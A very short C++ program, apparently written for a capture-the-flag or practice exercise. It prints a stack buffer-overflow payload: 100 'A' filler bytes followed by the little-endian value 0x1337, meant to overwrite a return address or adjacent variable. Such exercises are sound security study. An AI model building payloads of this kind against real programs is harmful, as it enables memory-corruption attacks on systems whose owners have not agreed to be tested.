#include <iostream>
#include <string>

int main(int argc, char const *argv[])
{
	char a = 0x00;
	char b = 0x13;
	char c = 0x37;

	printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%c%c%c%c",c,b,a,a);
	return 0;
}
